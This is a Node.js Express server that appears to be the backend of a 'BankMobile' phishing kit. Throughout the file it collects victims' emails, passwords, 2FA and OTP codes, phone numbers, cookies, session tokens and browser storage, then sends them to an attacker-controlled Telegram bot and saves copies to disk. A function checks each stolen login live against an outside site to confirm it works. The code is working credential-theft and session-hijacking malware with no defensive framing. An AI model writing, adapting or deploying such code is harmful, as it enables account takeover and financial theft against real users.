// ================================================
// BANKMOBILE - BACKEND ONLY
// ================================================

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3004;

// ================================================
// TELEGRAM CONFIG - FROM ENV
// ================================================
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ================================================
// CORS - Allow all origins (for frontend deployed elsewhere)
// ================================================
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ================================================
// SEND TO TELEGRAM
// ================================================
async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.log('⚠️ Telegram not configured');
        return;
    }
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram sent');
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
    }
}

// ================================================
// RECEIVE FULL SESSION DATA
// ================================================
app.post('/api/collect', async (req, res) => {
    const data = req.body;
    const clientIP = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ua = req.headers['user-agent'] || 'Unknown';
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
    
    console.log(`📥 FULL DATA RECEIVED - Step: ${data.step || 'unknown'}`);
    
    // Build Telegram message
    let msg = `🔐 <b>BANKMOBILE SESSION - STEP ${data.step || 'UNKNOWN'}</b>\n\n`;
    msg += `📡 <b>IP:</b> ${clientIP}\n`;
    msg += `🌐 <b>Browser:</b> ${ua.substring(0, 100)}\n`;
    msg += `🕐 <b>Time:</b> ${timestamp}\n`;
    msg += `🔑 <b>Client ID:</b> ${data.clientId || 'Unknown'}\n\n`;
    
    // ============================================
    // 1. CREDENTIALS
    // ============================================
    if (data.email || data.username || data.password || data.twofa) {
        msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `<b>🔐 CREDENTIALS</b>\n`;
        if (data.email) msg += `📧 <b>Email:</b> ${data.email}\n`;
        if (data.username) msg += `👤 <b>Username:</b> ${data.username}\n`;
        if (data.password) msg += `🔑 <b>Password:</b> ${data.password}\n`;
        if (data.twofa || data.code) msg += `🔢 <b>2FA Code:</b> ${data.twofa || data.code}\n`;
        if (data.phone) msg += `📱 <b>Phone:</b> ${data.phone}\n`;
        if (data.step) msg += `📌 <b>Step:</b> ${data.step}\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    }
    
    // ============================================
    // 2. COOKIES
    // ============================================
    if (data.cookies && Object.keys(data.cookies).length > 0) {
        msg += `🍪 <b>ALL COOKIES (${Object.keys(data.cookies).length})</b>\n`;
        Object.entries(data.cookies).forEach(([k, v]) => {
            const val = v || '[empty]';
            msg += `   ${k}: ${val.substring(0, 150)}${val.length > 150 ? '...' : ''}\n`;
        });
        msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    }
    
    // ============================================
    // 3. SESSION TOKENS
    // ============================================
    if (data.tokens && data.tokens.length > 0) {
        msg += `🔑 <b>ALL SESSION TOKENS (${data.tokens.length})</b>\n`;
        data.tokens.forEach(t => {
            const val = t.value || '[empty]';
            msg += `   ${t.key}: ${val.substring(0, 150)}${val.length > 150 ? '...' : ''}\n`;
        });
        msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    }
    
    // ============================================
    // 4. localStorage
    // ============================================
    if (data.localStorage && Object.keys(data.localStorage).length > 0) {
        msg += `💾 <b>localStorage (${Object.keys(data.localStorage).length} items)</b>\n`;
        Object.entries(data.localStorage).slice(0, 10).forEach(([k, v]) => {
            const val = typeof v === 'string' ? v : JSON.stringify(v);
            msg += `   ${k}: ${val.substring(0, 120)}${val.length > 120 ? '...' : ''}\n`;
        });
        if (Object.keys(data.localStorage).length > 10) {
            msg += `   ... and ${Object.keys(data.localStorage).length - 10} more\n`;
        }
        msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    }
    
    // ============================================
    // 5. sessionStorage
    // ============================================
    if (data.sessionStorage && Object.keys(data.sessionStorage).length > 0) {
        msg += `📁 <b>sessionStorage (${Object.keys(data.sessionStorage).length} items)</b>\n`;
        Object.entries(data.sessionStorage).slice(0, 10).forEach(([k, v]) => {
            const val = typeof v === 'string' ? v : JSON.stringify(v);
            msg += `   ${k}: ${val.substring(0, 120)}${val.length > 120 ? '...' : ''}\n`;
        });
        if (Object.keys(data.sessionStorage).length > 10) {
            msg += `   ... and ${Object.keys(data.sessionStorage).length - 10} more\n`;
        }
        msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    }
    
    // ============================================
    // 6. PAGE INFO
    // ============================================
    if (data.page) {
        msg += `📄 <b>PAGE INFO</b>\n`;
        if (data.page.title) msg += `   Title: ${data.page.title}\n`;
        if (data.page.url) msg += `   URL: ${data.page.url}\n`;
        if (data.page.referrer) msg += `   Referrer: ${data.page.referrer}\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    }
    
    // ============================================
    // 7. SUMMARY
    // ============================================
    msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `📊 <b>SUMMARY</b>\n`;
    msg += `   Credentials: ${data.email || data.username || data.password ? '✅' : '❌'}\n`;
    msg += `   2FA Code: ${data.twofa || data.code ? '✅' : '❌'}\n`;
    msg += `   Phone: ${data.phone ? '✅' : '❌'}\n`;
    msg += `   Cookies: ${data.cookies ? Object.keys(data.cookies).length : 0}\n`;
    msg += `   Tokens: ${data.tokens ? data.tokens.length : 0}\n`;
    msg += `   localStorage: ${data.localStorage ? Object.keys(data.localStorage).length : 0}\n`;
    msg += `   sessionStorage: ${data.sessionStorage ? Object.keys(data.sessionStorage).length : 0}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    
    // Send to Telegram
    await sendToTelegram(msg);
    
    // Save locally (note: this won't work on Railway since filesystem is ephemeral)
    try {
        const filename = `data/full_${Date.now()}.json`;
        if (!fs.existsSync('./data')) fs.mkdirSync('./data');
        fs.writeFileSync(filename, JSON.stringify({ 
            timestamp, 
            ip: clientIP, 
            step: data.step, 
            data 
        }, null, 2));
        console.log(`💾 Saved to ${filename}`);
    } catch (error) {
        console.log('⚠️ Could not save file (expected on Railway)');
    }
    
    res.json({ status: 'ok', id: data.clientId });
});

// ================================================
// BANKMOBILE AUTHENTICATION ENDPOINTS
// ================================================

// Authentication function - REAL validation
async function authenticateWithAPI(email, password) {
    try {
        console.log('🌐 Sending login request to vibeaccount.com...');
        
        const params = new URLSearchParams();
        params.append('usrname', email);
        params.append('passwd', password);
        
        const response = await axios.post('https://profile.refundselection.com/authenticate/login', 
            params.toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxRedirects: 0,
                validateStatus: (status) => status < 500
            }
        );
        
        console.log(`Response status: ${response.status}`);
        
        if (response.status === 302) {
            console.log('✅ SUCCESS');
            return { success: true };
        }
        
        console.log('❌ FAILED');
        return { success: false };
        
    } catch (error) {
        if (error.response && error.response.status === 302) {
            console.log('✅ SUCCESS (redirect)');
            return { success: true };
        }
        
        console.log('❌ FAILED:', error.message);
        return { success: false };
    }
}

// Login endpoint - Captures all data
app.post('/authenticate', async (req, res) => {
    const { email, password, fullData } = req.body;
    
    console.log(`\n🔐 Login: ${email}`);
    
    // Send to Telegram with full data if provided
    if (fullData) {
        await sendToTelegram(`🔐 <b>FULL LOGIN DATA CAPTURED</b>\n\n📧 ${email}\n🔑 ${password}\n🍪 Cookies: ${fullData.cookies ? Object.keys(fullData.cookies).length : 0}\n🔑 Tokens: ${fullData.tokens ? fullData.tokens.length : 0}\n💾 localStorage: ${fullData.localStorage ? Object.keys(fullData.localStorage).length : 0}`);
    }
    
    // Also send basic credentials
    await sendToTelegram(`🔐 <b>BANKMOBILE LOGIN</b>\n📧 ${email}\n🔑 ${password}`);
    
    const result = await authenticateWithAPI(email, password);
    
    if (result.success) {
        await sendToTelegram(`✅ <b>SUCCESS!</b>\n📧 ${email}`);
        console.log('✅ VALID');
        res.json({ success: true });
    } else {
        await sendToTelegram(`❌ <b>FAILED</b>\n📧 ${email}`);
        console.log('❌ INVALID');
        res.json({ success: false, error: 'Invalid credentials' });
    }
});

// Phone endpoint - Captures data
app.post('/submit-phone', async (req, res) => {
    const { phone, fullData } = req.body;
    console.log(`📱 Phone: ${phone}`);
    
    await sendToTelegram(`📱 <b>PHONE NUMBER</b>\nNumber: ${phone}`);
    
    // If full data provided, send it too
    if (fullData) {
        await sendToTelegram(`📱 <b>FULL DATA WITH PHONE</b>\n🍪 Cookies: ${fullData.cookies ? Object.keys(fullData.cookies).length : 0}\n🔑 Tokens: ${fullData.tokens ? fullData.tokens.length : 0}`);
    }
    
    res.json({ success: true });
});

// OTP endpoint - Captures data
app.post('/submit-otp', async (req, res) => {
    const { otp, trusted, fullData } = req.body;
    console.log(`🔐 OTP: ${otp}`);
    
    await sendToTelegram(`🔐 <b>2FA CODE</b>\nCode: ${otp}\nTrusted: ${trusted || false}`);
    
    // If full data provided, send it too
    if (fullData) {
        await sendToTelegram(`🔐 <b>FULL DATA WITH 2FA</b>\n🍪 Cookies: ${fullData.cookies ? Object.keys(fullData.cookies).length : 0}\n🔑 Tokens: ${fullData.tokens ? fullData.tokens.length : 0}`);
    }
    
    res.json({ success: true });
});

// ================================================
// HEALTH CHECK
// ================================================
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        service: 'bankmobile-backend',
        telegram: BOT_TOKEN ? '✅ configured' : '❌ not configured'
    });
});

// ================================================
// ROOT - Simple message (no HTML)
// ================================================
app.get('/', (req, res) => {
    res.json({
        service: 'BankMobile Backend API',
        status: 'running',
        endpoints: {
            'POST /api/collect': 'Collect full session data',
            'POST /authenticate': 'Authenticate user',
            'POST /submit-phone': 'Submit phone number',
            'POST /submit-otp': 'Submit OTP code',
            'GET /health': 'Health check'
        },
        telegram: BOT_TOKEN ? '✅ configured' : '❌ not configured'
    });
});

// ================================================
// START SERVER
// ================================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   🔐 BANKMOBILE BACKEND                                     ║
║                                                               ║
║   📡 Server: http://localhost:${PORT}                          ║
║   📨 TELEGRAM: ${BOT_TOKEN ? '✅ CONFIGURED' : '❌ NOT CONFIGURED'}
║                                                               ║
║   🔥 ENDPOINTS:                                              ║
║   POST /api/collect     - Collect session data              ║
║   POST /authenticate    - Authenticate user                 ║
║   POST /submit-phone    - Submit phone number               ║
║   POST /submit-otp      - Submit OTP code                   ║
║   GET  /health          - Health check                      ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
    `);
});
